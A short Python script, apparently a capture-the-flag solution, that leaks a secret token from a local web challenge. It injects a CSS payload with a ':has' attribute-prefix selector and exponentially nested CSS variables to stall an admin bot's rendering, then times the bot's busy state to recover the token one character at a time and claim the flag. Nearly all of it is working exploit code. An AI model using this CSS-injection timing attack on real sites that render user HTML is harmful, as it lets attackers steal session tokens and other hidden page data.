import httpx
import time


BASE_URI = "http://localhost:8080"

PAYLOAD = """
<style>
html:has([data-token^="{FOUND}"]) {
    --a: url(/?1),url(/?1),url(/?1),url(/?1),url(/?1);
    --b: var(--a),var(--a),var(--a),var(--a),var(--a);
    --c: var(--b),var(--b),var(--b),var(--b),var(--b);
    --d: var(--c),var(--c),var(--c),var(--c),var(--c);
    --e: var(--d),var(--d),var(--d),var(--d),var(--d);
    --f: var(--e),var(--e),var(--e),var(--e),var(--e);
    --g: var(--f),var(--f),var(--f),var(--f),var(--f);
}
*{
background-image: var(--f)
}
</style>
"""


def get_flag(token):
    print(httpx.post(BASE_URI + "/flag", params={"token": token}).text)


def tryChar(a):
    print(f"!! trying {a}")
    resp = httpx.get(
        BASE_URI + "/bot",
        params={"code": PAYLOAD.replace("{FOUND}", a)},
        timeout=8.0,
    )
    if "open" in resp.text:
        time.sleep(4)
        resp = httpx.get(
            BASE_URI + "/bot",
            params={"code": PAYLOAD.replace("{FOUND}", a)},
            timeout=8.0,
        )
        print(resp.text)
    duration = 0

    start_time = time.time()
    while True:
        time.sleep(0.25)
        resp = httpx.get(
            BASE_URI + "/bot",
            params={"code": PAYLOAD.replace("{FOUND}", a)},
            timeout=8.0,
        )
        print(resp.text)
        if "open" not in resp.text:
            duration = time.time() - start_time
            break
    print("res:duration", duration)

    time.sleep(1)
    return duration > 4.5

    print(resp.status_code)


alphabet = "4abcdefghijklmnopqrstuvwxyz123456789"
token = ""
index = 0


while len(token) < 6:
    for a in alphabet:
        res = tryChar(token + a)
        if res:
            print("found a char", token + a)
            token += a
            break


get_flag(token)
